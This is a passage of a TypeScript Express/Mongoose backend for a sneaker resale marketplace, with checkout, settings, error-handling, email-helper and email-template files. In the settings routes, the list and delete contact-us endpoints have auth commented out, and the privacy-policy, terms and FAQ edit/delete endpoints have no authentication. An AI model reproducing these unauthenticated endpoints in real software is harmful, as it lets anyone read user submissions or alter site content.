    buyerId: { type: Schema.Types.ObjectId, required: true, ref: "User" },
    name: { type: String, required: true },
    details: { type: String, default: String },
    images: [{ type: String, required: true }],
    price: { type: Number, required: true, default: 0 },
    offerHistory: [
        {
            offeredBy: { type: String, enum: Object.values(ENUM_USER_Type), required: true },
            price: { type: Number, required: true },
            // note: { type: String },
            createdAt: { type: Date, default: Date.now }
        }
    ],
    brand: { type: String, default: "" , required: true},
    size: { type: String, required: true },
    condition: { 
        type: String, 
        enum: Object.values(ENUM_OLD_PAIR_CONTITION), 
        default: ENUM_OLD_PAIR_CONTITION.DEADSTOCK
    },
    isVisible: { type: Boolean, default: true },
    visiblityDistance: { type: Number, default: 0 }, //km

}, { timestamps: true });

const OldPairModel = models.OldPair || model<IOldPair>("OldPair", OldPairSchema);

export default OldPairModel;
```

## File: src/app/module/OldPair/OldPair.routes.ts
```typescript
import express from "express";
import {auth} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import OldPairValidations from "./OldPair.validation";
import OldPairController from "./OldPair.controller";


const OldPairRouter = express.Router();



export default OldPairRouter;
```

## File: src/app/module/OldPair/OldPair.service.ts
```typescript
import ApiError from "../../../error/ApiError";
import { IJwtPayload } from "../../../interface/jwt.interface";
import { IOldPair } from "./OldPair.interface";
import OldPairModel from "./OldPair.model";


const addOldPairToResellService = async (userDetail:IJwtPayload, payload: Partial<IOldPair>) => {

    const {profileId} = userDetail;

    //create new order

    const oldPair = await OldPairModel.create({
        buyerId: profileId,
        ...payload
    });

    if(!oldPair){
        throw new ApiError(500,"Failed to add new old pair.");
    }

    //send notification to retailer

};

const OldPairServices = { 
    addOldPairToResellService
};

export default OldPairServices;
```

## File: src/app/module/OldPair/OldPair.validation.ts
```typescript
import { z } from "zod";

        
const addOldPairValidationSchema = z.object({
    body: z.object({
        name: z.string().min(1,"Name is required"),
        details: z.string().min(1,"details is required").optional,
        price: z.number().min(1,"price is required"),
        brand: z.string().min(1,"Brand is required"),
        size: z.string().min(1,"Size is required"),
        condition: z.string().min(1,"Condition is required"),
        isVisible: z.boolean(),
        visiblityDistance: z.number().min(1, "distance is required")
    }),
});

const OldPairValidations = { 
    addOldPairValidationSchema
 };

export default OldPairValidations;
```

## File: src/app/module/Order/Checkout.service.ts
```typescript
// checkout.service.ts
import mongoose, { Types } from "mongoose";
import CartModel from "../Cart/Cart.model";
import { OrderItemModel, OrderModel, SellerSplitOrderModel } from "./Order.model";
import { PaymentModel } from "../Payment/Payment.model";
import { completeOrderAfterPayment } from "../Payment/PaymentSuccess.service";

interface CheckoutPayload {
    buyerId: string;

    paymentMethod:
        | "STRIPE"
        | "SSL_COMMERZ"
        | "BKASH"
        | "COD";

    shippingAddress: {
        name: string;
        phone: string;
        address: string;
        city: string;
        area?: string;
    };
}

export const checkoutService = async (
    payload: CheckoutPayload
) => {

    const session = await mongoose.startSession();

    try {

        session.startTransaction();

        // =====================================================
        // 1. GET ACTIVE CARTS
        // =====================================================

        const carts = await CartModel.find({
            buyerId: payload.buyerId,
            status: "ACTIVE",
        }).populate("productId").session(session);

        if (!carts.length) {
            throw new Error("Cart is empty");
        }

        // =====================================================
        // 2. VALIDATE PRODUCTS & STOCK
        // =====================================================

        let subtotal = 0;

        for (const cart of carts) {

            const product: any = cart.productId;

            if (!product) {
                throw new Error("Product not found");
            }

            // Example size stock structure:
            // sizes: [{ size: 42, stock: 5 }]

            const sizeVariant = product.sizes.find(
                (s: any) => s.size === cart.selectedSize
            );

            if (!sizeVariant) {
                throw new Error(
                    `Size ${cart.selectedSize} unavailable`
                );
            }

            if (sizeVariant.stock < cart.quantity) {
                throw new Error(
                    `${product.name} out of stock`
                );
            }

            // NEVER TRUST FRONTEND PRICE
            cart.unitPrice = product.price;

            cart.totalPrice = product.price * cart.quantity;

            subtotal += cart.totalPrice;
        }

        // =====================================================
        // 3. CALCULATE TOTALS
        // =====================================================

        const shippingCharge = 100;

        const discountAmount = 0;

        const totalAmount =
            subtotal +
            shippingCharge -
            discountAmount;

        // =====================================================
        // 4. CREATE MAIN ORDER
        // =====================================================

        const order = await OrderModel.create([{
            buyerId: payload.buyerId,

            orderNumber: `ORD-${Date.now()}`,

            subtotal,
            shippingCharge,
            discountAmount,
            totalAmount,

            totalItems: carts.length,

            paymentStatus: "PENDING",

            orderStatus: "PLACED",

            paymentMethod: payload.paymentMethod,

            shippingAddress: payload.shippingAddress,

        }], { session });

        const createdOrder = order[0];

        // =====================================================
        // 5. CREATE ORDER ITEMS
        // =====================================================

        const orderItems = carts.map((cart: any) => {

            const product = cart.productId;

            return {

                orderId: createdOrder._id,

                buyerId: payload.buyerId,

                retailerId: cart.retailerId,

                productId: cart.productId._id,

                productSnapshot: {
                    name: product.name,
                    image: product.image,
                    brand: product.brand,
                },

                selectedSize: cart.selectedSize,

                quantity: cart.quantity,

                unitPrice: cart.unitPrice,

                totalPrice: cart.totalPrice,

                status: "PLACED",
            };
        });

        await OrderItemModel.insertMany(
            orderItems,
            { session }
        );

        // =====================================================
        // 6. CREATE SELLER SPLIT ORDERS
        // =====================================================

        const retailerMap = new Map();

        carts.forEach((cart: any) => {

            const retailerId =
                cart.retailerId.toString();

            if (!retailerMap.has(retailerId)) {
                retailerMap.set(retailerId, {
                    retailerId,
                    totalItems: 0,
                    totalAmount: 0,
                });
            }

            const existing =
                retailerMap.get(retailerId);

            existing.totalItems += cart.quantity;

            existing.totalAmount += cart.totalPrice;
        });

        const sellerSplitOrders = Array.from(
            retailerMap.values()
        ).map((retailer: any) => ({
            orderId: createdOrder._id,

            retailerId: retailer.retailerId,

            buyerId: payload.buyerId,

            totalItems: retailer.totalItems,

            totalAmount: retailer.totalAmount,

            status: "PLACED",
        }));

        await SellerSplitOrderModel.insertMany(
            sellerSplitOrders,
            { session }
        );

        // =====================================================
        // 7. CREATE PAYMENT RECORD
        // =====================================================

        const payment = await PaymentModel.create([{
            orderId: createdOrder._id,

            buyerId: payload.buyerId,

            amount: totalAmount,

            gateway: payload.paymentMethod,

            transactionId: `TXN-${Date.now()}`,

            status: payload.paymentMethod === "COD"
                ? "SUCCESS"
                : "PENDING",
        }], { session });

        // =====================================================
        // 8. FOR COD AUTO COMPLETE
        // =====================================================

        if (payload.paymentMethod === "COD") {

            await completeOrderAfterPayment({
                orderId: createdOrder._id.toString(),
                transactionId: payment[0].transactionId,
                session,
            });
        }

        await session.commitTransaction();

        return {
            success: true,
            message: "Checkout successful",
            data: {
                order: createdOrder,
                payment: payment[0],
            }
        };

    } catch (error: any) {

        await session.abortTransaction();

        throw new Error(error.message);

    } finally {

        session.endSession();
    }
};
```

## File: src/app/module/Order/Order.validation.ts
```typescript
import { z } from "zod";

        
const u = z.object({
    body: z.object({
        name: z.string().optional(),
        phone: z.string().optional(),
        address: z.string().optional(),
    }),
});

const OrderValidations = { u };

export default OrderValidations;
```

## File: src/app/module/Payment/Payment.routes.ts
```typescript
import express from "express";
import {auth} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import PaymentValidations from "./Payment.validation";
import PaymentController from "./Payment.controller";


const PaymentRouter = express.Router();



export default PaymentRouter;
```

## File: src/app/module/Payment/Payment.validation.ts
```typescript
import { z } from "zod";

        
const u = z.object({
    body: z.object({
        name: z.string().optional(),
        phone: z.string().optional(),
        address: z.string().optional(),
    }),
});

const PaymentValidations = { u };

export default PaymentValidations;
```

## File: src/app/module/Report/Report.interface.ts
```typescript
import { Types } from "mongoose";

export interface IReport {
    buyerId: Types.ObjectId;
    retailerId: Types.ObjectId;
    orderId: Types.ObjectId;
    title: string;
    content: string;
    resolution: string;
    images: string[];
    contactMethod: string;
    isUrgent: boolean;
    isSolved: boolean;
}
```

## File: src/app/module/Report/Report.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import { IReport } from "./Report.interface";

const ReportSchema = new Schema<IReport>({
    buyerId: { type: Schema.Types.ObjectId, required: true, ref: "Buyer" },
    retailerId: { type: Schema.Types.ObjectId, required: true, ref: "Retailer" },
    orderId: { type: Schema.Types.ObjectId, ref: "Order", default: null },
    title: { type: String, required: true },
    content: { type: String , required: true},
    resolution: { type: String , default: ''},
    images: [{ type: String, default: "" }],
    contactMethod: { type: String, default: "Email" },
    isUrgent: { type: Boolean, default: false },
    isSolved: { type: Boolean, default: false },
    
}, { timestamps: true });

const ReportModel = models.Report || model<IReport>("Report", ReportSchema);

export default ReportModel;
```

## File: src/app/module/Settings/Settings.controller.ts
```typescript
import { Request,Response } from "express";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import SettingsServices from "./Settings.service";

const submitHelpAndSupport = catchAsync(async (req, res) => {

    const result = await SettingsServices.submitHelpAndSupportService(req.body);
    
    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "Profile updated successfully",
        data: result,
    });
});

const getHelpAndSupport = catchAsync(async (req, res) => {

    const result = await SettingsServices.getHelpAndSupportService();
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "retrieved all report.",
        data: result,
    });
});

const deleteHelpAndSupport = catchAsync(async (req, res) => {

    const result = await SettingsServices.deleteHelpAndSupportService(req.params.id);
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Deleted a report successfully.",
        data: result,
    });
});

//terms and consition

const getTermsConditions = catchAsync(async (req: Request, res: Response) => {

  const result = await SettingsServices.getTermsConditions();

  sendResponse(res, {
    statusCode: 200,
    success: true,
    message: 'Terms and Condition retrieved successfully',
    data: result,
  });
});

const getPrivacyPolicy = catchAsync(async (req: Request, res: Response) => {

  const result = await SettingsServices.getPrivacyPolicy();

  sendResponse(res, {
    statusCode: 200,
    success: true,
    message: 'Privacy Policy retrieved successfully',
    data: result,
  });
});

const editPrivacyPolicy = catchAsync(async (req: Request, res: Response) => {

  const result = await SettingsServices.editPrivacyPolicy(req.params.id, req.body);

  sendResponse(res, {
    statusCode: 200,
    success: true,
    message: 'Privacy policy updated successfully',
    data: result,
  });
});


const editTermsConditions = catchAsync(async (req: Request, res: Response) => {
    
  const result = await SettingsServices.editTermsConditions(
    req.params.id,
    req.body,
  );
  sendResponse(res, {
    statusCode: 200,
    success: true,
    message: 'Terms and Condition updated successfully',
    data: result,
  });
});

//faq

const createFaq = catchAsync(async (req: Request, res: Response) => {
    
  const result = await SettingsServices.createFaqService(req.body);

  sendResponse(res, {
    statusCode: 201,
    success: true,
    message: 'Faq created successfully.',
    data: result,
  });
});

const getAllFaq = catchAsync(async (req: Request, res: Response) => {
    
  const result = await SettingsServices.getFaqService();

  sendResponse(res, {
    statusCode: 200,
    success: true,
    message: 'Got all faq successfully.',
    data: result,
  });
});

const editFaq = catchAsync(async (req: Request, res: Response) => {
    
  const result = await SettingsServices.editFaqService(req.params.id,req.body);

  sendResponse(res, {
    statusCode: 200,
    success: true,
    message: 'Faq updated successfully',
    data: result,
  });
});

const deleteFaq = catchAsync(async (req: Request, res: Response) => {
    
  const result = await SettingsServices.deleteFaqService(req.params.id);

  sendResponse(res, {
    statusCode: 200,
    success: true,
    message: 'Faq deleted successfully',
    data: result,
  });
});

const SettingsController = { 
    submitHelpAndSupport,
    getHelpAndSupport,
    deleteHelpAndSupport,
    getTermsConditions,
    getPrivacyPolicy,
    editPrivacyPolicy,
    editTermsConditions,
    createFaq,
    getAllFaq,
    editFaq,
    deleteFaq
 };
export default SettingsController;
```

## File: src/app/module/Settings/Settings.routes.ts
```typescript
import express from "express";
import {auth} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import SettingsValidations from "./Settings.validation";
import SettingsController from "./Settings.controller";


const settingsRouter = express.Router();

//contact us routes
settingsRouter.post(
    "/submit-contact-us",
    // auth(),
    validateRequest(SettingsValidations.helpAndSupportValidation),
    SettingsController.submitHelpAndSupport
);

settingsRouter.get(
    "/get-contact-us",
    // auth(),
    // validateRequest(SettingsValidations.helpAndSupportValidation),
    SettingsController.getHelpAndSupport
);
settingsRouter.delete(
    "/delete-contact-us/:id",
    // auth(),
    // validateRequest(SettingsValidations.helpAndSupportValidation),
    SettingsController.deleteHelpAndSupport
);


//privacy policy
settingsRouter.get(
    "/get-privacy-policy",
    SettingsController.getPrivacyPolicy
);

settingsRouter.patch(
    "/update-privacy-policy/:id",
    validateRequest(SettingsValidations.settingsValidationSchema),
    SettingsController.editPrivacyPolicy
);

//terms and conditions
settingsRouter.get(
    "/get-terms-and-conditions",
    SettingsController.getTermsConditions
);

settingsRouter.patch(
    "/update-terms-and-conditions/:id",
    validateRequest(SettingsValidations.settingsValidationSchema),
    SettingsController.editTermsConditions
);

//faq routes
settingsRouter.post(
    "/create-faq",
    validateRequest(SettingsValidations.faqValidationSchema),
    SettingsController.createFaq
);

settingsRouter.get(
    "/get-all-faq",
    SettingsController.getAllFaq
);

settingsRouter.patch(
    "/edit-faq/:id",
    validateRequest(SettingsValidations.editFaqValidationSchema),
    SettingsController.editFaq
);

settingsRouter.delete(
    "/delete-faq/:id",
    SettingsController.deleteFaq
);  


export default settingsRouter;
```

## File: src/app/module/Settings/Settings.validation.ts
```typescript
import { z } from "zod";

const helpAndSupportValidation = z.object({
    body: z.object({
        phone: z.string().min(1, "phone is required"),
        email: z.string().trim().email("Invalid email address").transform((val) => val.toLowerCase()),
        description: z.string().min(1, "Description is required")
        
    })
});

const settingsValidationSchema = z.object({
    body: z.object({
        description: z.string().min(1, "Description is required to update")    
    }),
});

const faqValidationSchema = z.object({
    body: z.object({
        question: z.string().min(1, "Question is required"),    
        answer: z.string().min(1, "Answer is required to update"),    
    }),
});

const editFaqValidationSchema = z.object({
    body: z.object({
        question: z.string().min(1, "Question is required").optional(),    
        answer: z.string().min(1, "Answer is required to update").optional(),    
    }),
});

const SettingsValidations = { 
    helpAndSupportValidation,
    settingsValidationSchema,
    faqValidationSchema,
    editFaqValidationSchema
};

export default SettingsValidations;
```

## File: src/config/awsS3.ts
```typescript
// config/s3.ts
import { S3Client } from "@aws-sdk/client-s3";

export const s3 = new S3Client({
  region: process.env.AWS_REGION!,
  credentials: {
    accessKeyId: process.env.AWS_ACCESS_KEY_ID!,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY!,
  },
});
```

## File: src/config/mongoDB.ts
```typescript
import mongoose from "mongoose";
import config from "./index";

 const mongoDBConnection = async () => {
    try {
        await mongoose.connect(config.database_url as string);
        console.log("database connected successfully");
        
        
    } catch (error) {
        console.log(error);
        console.log("Failed to connect mongodb");
        
    }
}

export default mongoDBConnection;
```

## File: src/config/openAI.ts
```typescript
import OpenAI from "openai";
import config from "./index";

const openai = new OpenAI({
  apiKey: config.openai.openai_api_key
});

export default openai;
```

## File: src/config/stripe.ts
```typescript
// import Stripe from 'stripe';
// import config from '../config';

// const stripe = new Stripe(config.stripe.stripe_secret_key as string, {
//   apiVersion: '2024-09-30.acacia',
// });

// export default stripe;
```

## File: src/error/ApiError.ts
```typescript
class ApiError extends Error {
  public statusCode: number;
  constructor(statusCode: number, message: string, stack = '') {
    super(message);
    this.statusCode = statusCode;
    if (stack) {
      this.stack = stack;
    } else {
      Error.captureStackTrace(this, this.constructor);
    }
  }
}

export default ApiError;
```

## File: src/error/handleCastError.ts
```typescript
import mongoose from 'mongoose';
import {
  TErrorSources,
  TGenericErrorResponse,
} from '../interface/error.interface';

const handleCastError = (
  err: mongoose.Error.CastError,
): TGenericErrorResponse => {
  const errorSources: TErrorSources = [
    {
      path: err.path,
      message: err.message,
    },
  ];

  const statusCode = 400;
  return {
    statusCode,
    message: 'Invalid Id',
    errorSources,
  };
};

export default handleCastError;
```

## File: src/error/handleDuplicateError.ts
```typescript
/* eslint-disable @typescript-eslint/no-explicit-any */
import {
  TErrorSources,
  TGenericErrorResponse,
} from '../interface/error.interface';

const handleDuplicateError = (err: any): TGenericErrorResponse => {
  // Extract value within double quotes using regex
  const match = err.message.match(/"([^"]*)"/);

  // The extracted value will be in the first capturing group
  const extractedMessage = match && match[1];
  const errorSources: TErrorSources = [
    {
      path: '',
      message: `${extractedMessage} is already exists`,
    },
  ];
  const statusCode = 400;
  return {
    statusCode,
    message: 'Duplicate Error',
    errorSources,
  };
};

export default handleDuplicateError;
```

## File: src/error/handleValidationError.ts
```typescript
import mongoose from 'mongoose';
import {
  TErrorSources,
  TGenericErrorResponse,
} from '../interface/error.interface';

const handleValidationError = (
  err: mongoose.Error.ValidationError,
): TGenericErrorResponse => {
  const errorSources: TErrorSources = Object.values(err.errors).map(
    (val: mongoose.Error.ValidatorError | mongoose.Error.CastError) => {
      return {
        path: val?.path,
        message: val.message,
      };
    },
  );

  const statusCode = 400;
  return {
    statusCode,
    message: 'Validation Error',
    errorSources,
  };
};

export default handleValidationError;
```

## File: src/helper/bcryptHelper.ts
```typescript
import bcrypt from 'bcrypt';
// import config from '../../config';


export const hashPassword = async (password: string, saltRounds: number): Promise<string> => {
    const hashedPassword = await bcrypt.hash(password, saltRounds);
    return hashedPassword;
}

export const comparePassword = async (plainPassword: string, hashedPassword: string): Promise<boolean> => {
    const isMatch = await bcrypt.compare(plainPassword, hashedPassword);
    return isMatch;
}
```

## File: src/helper/emailHelper.ts
```typescript
import ApiError from "../error/ApiError";
import sendEmail from "./sendEmail";
// import resetPassEmailTemp from "../mailTemplate/resetPassEmailTemp";
import verifyEmailTemp from "../mailTemplate/verifyEmailTemp";
import { TEmailTemplate } from "../interface/email.interface";
// import supportEmailTemp from "../mailTemplate/supportEmailTemp";



export const sendVerificationEmail = async (email: string, data: TEmailTemplate) => {
  try {
    await sendEmail({
      email,
      subject: "Verify your email - health vault Security Code",
      html: verifyEmailTemp(data),
    });
  } catch (error) {
    console.log(error);
    throw new ApiError(500, "Email was not sent");
  }
};

// export const sendResetPasswordEmail = async (email, data) => {
//   try {
//     await sendEmail({
//       email,
//       subject: "Reset password code - PBFS Security Code",
//       html: resetPassEmailTemp(data),
//     });
//   } catch (error) {
//     console.log(error);
//     throw new ApiError(500, "Email was not sent");
//   }
// };

// export const sendSupportEmailToAdmin = async (email,subject,body) => {
//   try {
//     await sendEmail({
//       email,
//       subject: subject,
//       html: supportEmailTemp(body),
//     });
//   } catch (error) {
//     console.log(error);
//     throw new ApiError(500, "Email was not sent");
//   }
// };
```

## File: src/helper/jwtHelper.ts
```typescript
import jwt, { JwtPayload, Secret, SignOptions } from 'jsonwebtoken';

//create token
export const createToken = (
  tokenPayload: object,
  secret: Secret,
  expireTime: SignOptions["expiresIn"]
) => {
  const token = jwt.sign(tokenPayload, secret, { expiresIn: expireTime });
  return token;
};

//verify token
export const verifyToken = (token: string, secret: Secret) => {
  return jwt.verify(token, secret) as JwtPayload;
};
```

## File: src/helper/multer.ts
```typescript
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @typescript-eslint/ban-ts-comment */
import { Request } from 'express';
import multer from 'multer';
import fs from 'fs';
import path from 'path';

 // define storage for images
 export const profileStorage = multer.diskStorage({
   // destination: (req, file, cb) => {
   //   cb(null, "uploads/profile-image");
   // },
   destination: function (req: Request, file, cb) {
       let uploadPath = `uploads/${file.fieldname}`;
 
       cb(null, uploadPath);
   },
 
   filename: (req, file, cb) => {
     //extract the file extension from filename
     const fileExtension = path.extname(file.originalname);
 
     const fileName = file.originalname.replace(fileExtension, "").toLowerCase().split(" ").join("-") +"-" + Date.now();
 
     cb(null, fileName + fileExtension);
   },
 });
```

## File: src/helper/sendEmail.ts
```typescript
import nodemailer from 'nodemailer';
import config from '../config/index';

const currentDate = new Date();

const formattedDate = currentDate.toLocaleDateString("en-US", {
  year: "numeric",
  month: "2-digit",
  day: "2-digit",
});

const sendEmail = async (options:{email:string,subject:string,html:any}) => {
  const transporter = nodemailer.createTransport({
    // host: config.smtp.smtp_host,
    host: "smtp.gmail.com",
    port: parseInt(config.smtp.smtp_port as string),
    auth: {
      user: config.smtp.smtp_mail,
      pass: config.smtp.smtp_password,
    },
  });

  const { email, subject, html } = options;

  const mailOptions = {
    from: `${config.smtp.name} <${config.smtp.smtp_mail}>`,
    to: email,
    date: formattedDate,
    signed_by: "bdCalling.com",
    subject,
    html,
  };

  await transporter.sendMail(mailOptions);
};

export default sendEmail;
```

## File: src/interface/authRequest.ts
```typescript
// src/app/interfaces/authRequest.ts
import { Request } from 'express';

export interface AuthRequest extends Request {
  user: {
    authId: string;
    email: string;
    profileId: string;
  };
}
```

## File: src/interface/email.interface.ts
```typescript
export type TEmailTemplate = {
  name: string;
  code: string;
};
```

## File: src/interface/error.interface.ts
```typescript
export type TErrorSources = {
  path: number | string;
  message: string;
}[];

export type TGenericErrorResponse = {
  statusCode: number;
  message: string;
  errorSources: TErrorSources;
};
```

## File: src/interface/index.d.ts
```typescript
import { JwtPayload } from 'jsonwebtoken';

declare global {
  namespace Express {
    interface Request {
      user: JwtPayload;
    }
  }
}
```

## File: src/interface/jwt.interface.ts
```typescript
export interface IJwtPayload {
    authId: string;
    email: string;
    profileId: string
}
```

## File: src/mailTemplate/registerSucessEmail.ts
```typescript
const registrationSuccessEmailBody = (name: string, activationCode: number) => `
  <html>
    <head>
      <style>
        body {
          font-family: 'Helvetica', 'Arial', sans-serif;
          margin: 0;
          padding: 0;
          background-color: #f7f9fc;
        }
        .container {
          max-width: 600px;
          margin: 0 auto;
          padding: 40px 20px;
          background-color: #ffffff;
          border-radius: 8px;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }
        .header {
          background-color: #007bff;
          padding: 20px;
          border-top-left-radius: 8px;
          border-top-right-radius: 8px;
          color: #ffffff;
          text-align: center;
        }
        .header h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 600;
        }
        .content {
          padding: 30px;
          color: #333333;
        }
        .content h2 {
          font-size: 22px;
          color: #333333;
          margin-bottom: 20px;
          font-weight: 600;
        }
        .content p {
          font-size: 16px;
          color: #666666;
          line-height: 1.6;
          margin-bottom: 20px;
        }
        .activation-code {
          font-size: 28px;
          color: #007bff;
          font-weight: 700;
          text-align: center;
          margin-bottom: 20px;
        }
        .button-container {
          text-align: center;
          margin: 40px 0;
        }
        .button {
          padding: 12px 30px;
          background-color: #007bff;
          color: #ffffff;
          text-decoration: none;
          border-radius: 6px;
          font-size: 16px;
          font-weight: 600;
        }
        .button-text {
          color: #fff;
        }
        .button:hover {
          background-color: #0056b3;
        }
        .footer {
          padding: 20px;
          font-size: 14px;
          color: #999999;
          text-align: center;
          background-color: #f7f9fc;
          border-bottom-left-radius: 8px;
          border-bottom-right-radius: 8px;
        }
        .footer p {
          margin: 5px 0;
        }
        .footer a {
          color: #007bff;
          text-decoration: none;
        }
        .footer a:hover {
          text-decoration: underline;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>Welcome to Template</h1>
        </div>
        <div class="content">
          <h2>Hello, ${name}</h2>

          <p>Thank you for registering with Colab. To activate your account, please use the following activation code:</p>
            <div class="activation-code">${activationCode || 'XXXXXX'}</div>
            <p>Enter this code on the activation page within the next 10 minutes. If you don't your account will be deleted from the database and you will need to register again.</p>
            <div class="button-container">
              <a href="https://yourwebsite.com/activate" class="button">
                <span class="activate-btn">Activate Now</span>
              </a>
            </div>
            <p>If you didn't register, ignore this email.</p>
            /* TODO: set client email here  */
          <p>If you have any questions, feel free to contact us at <a href="maniksarker265@gmail.com">maniksarker265@gmail.com</a>.</p>
        </div>
        <div class="footer">
          <p>&copy; ${new Date().getFullYear()} Template. All rights reserved.</p>
          <p><a href="https://yourwebsite.com/privacy">Privacy Policy</a> | <a href="https://yourwebsite.com/contact">Contact Us</a></p>
        </div>
      </div>
    </body>
  </html>
`;

export default registrationSuccessEmailBody;
```

## File: src/mailTemplate/resetPassEmailTemp.ts
```typescript
import { TEmailTemplate } from "../interface/email.interface";

const resetPassEmailTemp = (data: TEmailTemplate) => `
  <html>
    <head>
      <style>
        body {
          font-family: 'Verdana', 'Arial', sans-serif;        
          font-family: Arial, sans-serif;
          background-color: #f2f3f8;
          margin: 0;
          padding: 0;
        }
        .container {
          font-family: 'Verdana', 'Arial', sans-serif;        
          max-width: 600px;
          margin: 40px auto;
          background-color: #ffffff;
          padding: 40px;
          border-radius: 10px;
          box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
        }
        h1 {
          color: #022C22;
          font-size: 26px;
          margin-bottom: 20px;
          font-weight: bold;
          text-align: center;
        }
        p {
          color: #555555;
          line-height: 1.8;
          font-size: 16px;
          margin-bottom: 20px;
        }
        .logo {
          text-align: center;
        }
        .logo-img {
          max-width: 20%;

        }
        .code {
          text-align: center;
          background-color: #e8f0fe;
          padding: 14px 24px;
          font-size: 20px;
          font-weight: bold;
          color: #022C22;
          border-radius: 6px;
          letter-spacing: 2px;
          margin: 20px 0;
        }
        .footer {
          margin-top: 30px;
          font-size: 13px;
          color: #9e9e9e;
          text-align: center;
        }
        .footer p {
          margin: 5px 0;
        }
        a {
          color: #022C22;
          text-decoration: none;
        }
      </style>
    </head>
     
    <body>
      <div class="container">
        
        <p>Hello, ${data.name}</p>
        <p>We received a request to reset your password for Nutrition app. Use the OTP below to proceed<p>
        <h3>Your Otp: ${data.code}</h3>
        <p>This code will expire in 10 minutes. If you didnt request this, please ignore this email.</p>
        
        <p>Best Regards,<br>Team PBFS</p>
      </div>
      <div class="footer">
       <a href="https://profitablebusinessesforsale.com/"><img src="https://pbfsimage.s3.eu-north-1.amazonaws.com/Pbfs_logo.png" class="logo-img"/></a>
       <p> <a href="https://profitablebusinessesforsale.com/">ProfitableBusinessesForSale.com</a> | <a href="info@ProfitableBusinessesForSale.com">info@ProfitableBusinessesForSale.com</a>.</p>
        <p> Follow Us on 
          <a href="https://www.facebook.com/share/1J7PbBaf1G/?mibextid=wwXIfr">Facebook</a> |

          <a href="https://www.instagram.com/profitablebusinessesforsale?igsh=MTc5bTVrcWJoZHNtbQ%3D%3D&utm_source=…">Instagram</a>
        </p>
      </div>
    </body>
  </html>
`;

export default resetPassEmailTemp;

//  /<-- <a href="https://profitablebusinessesforsale.com/"><img src="uploads/logo/pbfs-logo.png" alt="PBFS" class="logo-img"/></a> -->
```

## File: src/mailTemplate/resetPasswordEmailBody.ts
```typescript
const resetPasswordEmailBody = (name: string, resetCode: number) => `
  <html>
    <head>
      <style>
        body {
          font-family: 'Helvetica', 'Arial', sans-serif;
          margin: 0;
          padding: 0;
          background-color: #f7f9fc;
        }
        .container {
          max-width: 600px;
          margin: 0 auto;
          padding: 40px 20px;
          background-color: #ffffff;
          border-radius: 8px;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }
        .header {
          background-color: #d9534f;
          padding: 20px;
          border-top-left-radius: 8px;
          border-top-right-radius: 8px;
          color: #ffffff;
          text-align: center;
        }
        .header h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 600;
        }
        .content {
          padding: 30px;
          color: #333333;
        }
        .content h2 {
          font-size: 22px;
          color: #333333;
          margin-bottom: 20px;
          font-weight: 600;
        }
        .content p {
          font-size: 16px;
          color: #666666;
          line-height: 1.6;
          margin-bottom: 20px;
        }
        .reset-code {
          font-size: 28px;
          color: #d9534f;
          font-weight: 700;
          text-align: center;
          margin-bottom: 20px;
        }
        .footer {
          padding: 20px;
          font-size: 14px;
          color: #999999;
          text-align: center;
          background-color: #f7f9fc;
          border-bottom-left-radius: 8px;
          border-bottom-right-radius: 8px;
        }
        .footer p {
          margin: 5px 0;
        }
        .footer a {
          color: #d9534f;
          text-decoration: none;
        }
        .footer a:hover {
          text-decoration: underline;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>Password Reset Request</h1>
        </div>
        <div class="content">
          <h2>Hello, ${name}</h2>

          <p>We received a request to reset your password. Please use the code below to proceed with resetting your password:</p>
          <div class="reset-code">
            ${resetCode || 'XXXXXX'}
          </div>
          <p>Enter this code on the password reset page within the next 10 minutes. If you didn't request a password reset, you can ignore this email.</p>
          <p>If you have any questions, feel free to contact us at <a href="mailto:maniksarker265@gmail.com">maniksarker265@gmail.com</a>.</p>
        </div>
        <div class="footer">
          <p>&copy; ${new Date().getFullYear()} Template. All rights reserved.</p>
          <p><a href="https://colab.com/privacy">Privacy Policy</a> | <a href="https://colab.com/contact">Contact Us</a></p>
        </div>
      </div>
    </body>
  </html>
`;

export default resetPasswordEmailBody;
```

## File: src/mailTemplate/supportEmailTemp.ts
```typescript
import { TEmailTemplate } from "../interface/email.interface";

const supportEmailTemp = (data: TEmailTemplate) => `
  <html>
    <head>
      <style>
        body {
          font-family: 'Verdana', 'Arial', sans-serif;        
          font-family: Arial, sans-serif;
          background-color: #f2f3f8;
          margin: 0;
          padding: 0;
        }
        .container {
          font-family: 'Verdana', 'Arial', sans-serif;        
          max-width: 600px;
          margin: 40px auto;
          background-color: #ffffff;
          padding: 40px;
          border-radius: 10px;
          box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
        }
        h1 {
          color: #022C22;
          font-size: 26px;
          margin-bottom: 20px;
          font-weight: bold;
          text-align: center;
        }
        p {
          color: #555555;
          line-height: 1.8;
          font-size: 16px;
          margin-bottom: 20px;
        }
        .logo {
          text-align: center;
        }
        .logo-img {
          max-width: 20%;

        }
        .code {
          text-align: center;
          background-color: #e8f0fe;
          padding: 14px 24px;
          font-size: 20px;
          font-weight: bold;
          color: #022C22;
          border-radius: 6px;
          letter-spacing: 2px;
          margin: 20px 0;
        }
        .footer {
          margin-top: 30px;
          font-size: 13px;
          color: #9e9e9e;
          text-align: center;
        }
        .footer p {
          margin: 5px 0;
        }
        a {
          color: #022C22;
          text-decoration: none;
        }
      </style>
    </head>
     
    <body>
      <div class="container">
        <h1>Welcome to PBFS!</h1>
        <p>Hello, ${data.name}</p>
        <p>Thank you for choosing tow factor authentication. To verify your recovery email and secure your account, please use the one-time password (OTP) below:</p>
        <h3>Your Otp: ${data.code}</h3>
